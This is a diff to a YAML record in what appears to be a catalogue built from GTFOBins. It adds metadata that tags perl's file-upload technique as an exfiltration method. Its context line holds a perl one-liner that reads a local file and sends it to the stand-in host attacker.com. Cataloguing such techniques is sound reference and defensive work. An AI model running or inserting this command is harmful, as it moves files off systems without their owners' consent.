@@ -12,7 +12,7 @@ sources:
   upstream_url: https://gtfobins.github.io
   license: GPL-3.0
   upstream_version: acd5246
-  last_synced: '2026-08-25'
+  last_synced: '2026-08-28'
 commands:
 - template: 'perl -MIO::Socket::INET -e ''$s = new IO::Socket::INET(PeerAddr=>"attacker.com", PeerPort=>80,
     Proto=>"tcp") or die;open(my $file, "<", "/path/to/input-file") or die;$content = join("", <$file>);close($file);$headers
@@ -25,3 +25,43 @@ tags:
 - linux
 - unix
 - gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      binary: perl
+      function: upload
+      context: unprivileged
+    upstream_url: https://gtfobins.github.io/gtfobins/perl/
+    upstream_version: acd5246
+    last_synced: '2026-08-28'
+enrichment:
+  capabilities:
+  - value: file-upload
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd5246
+    confidence:
+      level: high
+  phases:
+  - value: exfiltration
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd5246
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd5246
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  model: layered
+  projected_at: '2026-08-28'
+  source_hashes:
+    GTFOBins: sha256:7f1af374a958323f811999b0c939c257faca73704f66d2ee520ff6fa13ebe45e
